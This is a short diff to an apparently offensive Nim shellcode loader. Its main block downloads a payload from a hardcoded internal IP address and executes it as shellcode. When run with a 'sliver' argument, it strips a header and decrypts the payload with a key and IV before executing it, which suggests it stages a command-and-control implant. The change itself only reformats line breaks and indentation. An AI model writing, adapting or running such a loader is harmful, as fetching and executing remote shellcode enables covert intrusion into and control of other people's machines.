@@ -85,7 +85,8 @@ when isMainModule:
         #If no parameters passed use hardcoded http url from the code to be customised per network
         if (paramCount() == 0):    
             var client = newHttpClient()
-            var url = "http://10.90.248.103:80/test.bin"
+            var url = 
+            "http://10.90.248.103:80/test.bin"
             var response: string = client.getContent(url) 
             shellcode = toByteSeq(response)                 
             runShellcode(shellcode) 
@@ -102,7 +103,8 @@ when isMainModule:
             if ($paramStr(1) == "sliver"):                 
                 for i in 16  ..< shellcode.len:
                     actual.add(shellcode[i])
-                shellcode = 
+            
+            shellcode = 
                 decrypt(actual,key,iv)                   
             runShellcode(shellcode)      
         
